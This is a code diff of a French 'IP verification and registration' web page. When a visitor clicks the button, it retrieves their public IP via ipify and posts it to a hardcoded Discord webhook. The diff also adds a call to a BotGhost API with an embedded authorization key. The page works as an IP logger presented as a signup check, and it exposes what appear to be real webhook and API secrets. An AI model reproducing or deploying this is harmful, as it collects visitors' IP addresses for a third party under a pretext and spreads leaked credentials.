@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification</title>
+    <title>Vérification d'IP et Inscription</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -12,7 +12,7 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: black;
+            background-color: #f4f4f4;
         }
         #container {
             text-align: center;
@@ -33,40 +33,39 @@
             color: #555;
         }
         button {
-            padding: 10px;
+            margin-top: 10px;
+            padding: 8px;
             width: 100%;
-            border: none;
+            border: 1px solid #ddd;
             border-radius: 4px;
-            background-color: #007bff;
-            color: white;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #0056b3;
+            box-sizing: border-box;
         }
     </style>
 </head>
 <body>
     <div id="container">
-        <h1>Vérification</h1>
-        <button onclick="checkIP()">Vérifier et valider l'inscription</button>
+        <h1>Vérification de l'IP</h1>
+        <button onclick="checkIP()">Vérifier l'IP et valider l'inscription</button>
         <div id="result"></div>
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K";
+        const webhookURL = "https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K";  // Remplacez par votre webhook Discord
+        const apiUrl = "https://api.botghost.com/webhook/1151241118403534958/0t2nh2769i3bdja5axve7b";  // Remplacez par votre URL API
 
         function checkIP() {
+            // Récupère l'IP de l'utilisateur via l'API ipify
             fetch("https://api.ipify.org?format=json")
                 .then(response => response.json())
                 .then(data => {
                     const userIP = data.ip;
 
+                    // Prépare le message pour le webhook Discord
                     const message = {
                         content: `Nouvelle vérification : \n**IP**: ${userIP}`
                     };
 
+                    // Envoie les informations au webhook Discord
                     fetch(webhookURL, {
                         method: "POST",
                         headers: {
@@ -78,9 +77,37 @@
                         document.getElementById("result").innerText = "IP vérifiée et inscription validée !";
                     })
                     .catch(error => {
-                        console.error("Erreur lors de l'envoi au webhook:", error);
+                        console.error("Erreur lors de l'envoi au webhook Discord:", error);
                         document.getElementById("result").innerText = "Erreur lors de la validation.";
                     });
+
+                    // Envoie une requête POST à l'API BotGhost
+                    const apiPayload = {
+                        variables: [
+                            {
+                                name: "message",
+                                variable: "{event_message}",
+                                value: "HELLO from webhooks"
+                            }
+                        ]
+                    };
+
+                    fetch(apiUrl, {
+                        method: "POST",
+                        headers: {
+                            "Authorization": "bd8f5e61c5b98e12773f211488437e25f753c9139c32103c0bcce6f2bf9223f9",  // Remplacez par votre API_KEY
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(apiPayload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Réponse de BotGhost:", data);
+                    })
+                    .catch(error => {
+                        console.error("Erreur lors de l'envoi à l'API BotGhost:", error);
+                    });
+
                 })
                 .catch(error => {
                     document.getElementById("result").innerText = "Erreur lors de la récupération de l'IP.";
